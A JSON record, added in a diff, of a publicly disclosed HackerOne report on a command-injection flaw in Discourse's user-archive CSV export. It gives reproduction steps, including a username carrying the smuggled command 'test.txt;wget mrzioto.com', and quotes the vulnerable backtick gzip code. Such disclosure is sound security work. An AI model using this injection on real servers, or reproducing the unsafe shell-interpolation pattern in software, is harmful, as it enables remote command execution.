@@ -1,0 +1,122 @@
+{
+  "id": 214022,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQwMjI=",
+  "url": "https://hackerone.com/reports/214022",
+  "title": "Admin Command Injection via username in user_archive ExportCsvFile",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-03-16T22:05:10.800Z",
+  "submitted_at": "2017-03-16T22:05:10.800Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ziot",
+    "url": "/ziot",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/q6p4k8c7ra62zsly50iw31eedyw1/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16893,
+    "url": "https://hackerone.com/discourse",
+    "handle": "discourse",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Discourse",
+      "twitter_handle": "discourse",
+      "website": "https://discourse.org",
+      "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-05-13T21:25:53.259Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-04-13T21:25:34.943Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When a user generates a backup of their posts, their username gets sent to the `ExportCsvFile` job. The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.\n\n## Steps\n\n 1. Login as an admin on try.discourse.org, e.g.\n  * http://try.discourse.org/\n 2. Make a backup of the website and download it.\n 3. Extract the contents of the archive.\n 4. Modify one of the usernames of an account you have access to:\n  * test.txt;wget mrzioto.com\n 5. Repackage the archive.\n 6. Upload the modified archive.\n 7. Restore from backup.\n 8. Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it).\n 9. Send the POST request for creating a user export archive:\n  * http://34.205.246.2/export_csv/export_entity.json\n  * POST: entity_type=user&entity=user_archive\n 10. ---> You forced the server to make a wget leading to RCE/command injection.\n\n## Code Flow\n\n```\n      file_name_prefix = if @entity == \"user_archive\"\n        \"#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime(\"%y%m%d-%H%M%S\")}\"\n\n      file_name = \"#{file_name_prefix}-#{file.id}.csv\"\n      absolute_path = \"#{UserExport.base_directory}/#{file_name}\"\n\n      `gzip -5 #{absolute_path}`\n```",
+  "bounty_amount": "512.0",
+  "formatted_bounty": "$512",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-05-13T21:25:34.974Z",
+  "allow_singular_disclosure_after": -283629640.5975703,
+  "singular_disclosure_allowed": true,
+  "vote_count": 45,
+  "voters": [
+    "iamnoooob",
+    "ziot",
+    "inhibitor181",
+    "bogdantc",
+    "hunter",
+    "sameerphad72",
+    "metawolf",
+    "bl4de",
+    "ebrietas",
+    "yaworsk",
+    "and 35 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
